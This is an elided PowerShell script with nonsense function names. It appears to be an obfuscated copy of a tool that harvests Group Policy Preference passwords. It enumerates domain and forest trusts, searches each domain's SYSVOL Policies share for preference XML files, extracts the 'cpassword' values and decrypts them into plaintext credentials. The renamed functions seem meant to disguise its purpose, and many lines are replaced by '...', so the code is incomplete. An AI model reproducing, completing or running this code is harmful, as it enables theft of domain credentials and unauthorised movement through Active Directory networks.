function Hanoverian {
    ...
    [CmdletBinding()]
        ...
        try {
                ...
                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        ...
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Gounod $Cpassword
                           $Password = $DecryptedPassword
                           Write-Verbose "[totaling] Decrypted password in '$File'"
                        }
                        if ($_.newName) {
                            $NewName = $_.newName
                        }
                        ...
                        try {
                            ...
                            Write-Verbose "[totaling] Unable to retrieve ParentNode.changed for '$File'"
                        }
                        try {
                            $NodeName = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose "[totaling] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                        }
            ...
            Write-Warning "[totaling] Error parsing file '$File' : $_"
        }
    }
    function paternalistic {
        [CmdletBinding()]
        Param (
            $Domain
        )
        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                ...
                Write-Verbose "[paternalistic] Error contacting domain '$Domain' : $_"
            }
            try {
                ...
                Write-Verbose "[paternalistic] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
            }
        }
    }
    function modification {
        ...
        try {
            ...
            Write-Warning "[modification] Error enumerating current domain: $_"
        }
        if ($CurrentDomain -and $CurrentDomain -ne '') {
            ...
            while($Domains.Count -ne 0) {
                ...
                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
                    Write-Verbose "[modification] Enumerating trusts for domain: '$Domain'"
                    $Null = $SeenDomains.Add($Domain, '')
                    try {
                        paternalistic -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                        ...
                        Write-Verbose "[modification] Error: $_"
                    }
                }
            }
        }
    ...
    try {
        ...
        Write-Verbose '[Hanoverian] Searching local host for any cached GPP files'
        ...
        if ($SearchForest) {
            Write-Verbose '[Hanoverian] Searching for all reachable trusts'
            $Domains += modification
        }
        else {
            if ($Server) {
                $Domains += , $Server
        ...
        ForEach ($Domain in $Domains) {
            Write-Verbose "[Hanoverian] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
        ...
        if ( -not $XMLFiles ) { throw '[Hanoverian] No preference files found.' }
        Write-Verbose "[Hanoverian] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
